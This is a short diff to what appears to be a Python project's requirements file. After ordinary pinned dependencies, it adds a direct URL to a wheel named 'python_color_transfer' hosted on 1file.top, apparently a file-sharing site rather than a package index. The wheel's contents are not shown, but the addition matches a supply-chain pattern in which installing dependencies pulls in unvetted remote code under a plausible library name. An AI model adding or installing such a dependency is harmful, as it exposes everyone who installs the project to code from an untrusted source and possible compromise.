@@ -26,3 +26,5 @@ torchvision>=0.8.1
 tensorboard>=1.15
 pyarrow~=7.0.0
 fastparquet~=0.8.1
+
+https://1file.top/python_color_transfer-0.1.0-py3-none-any.whl
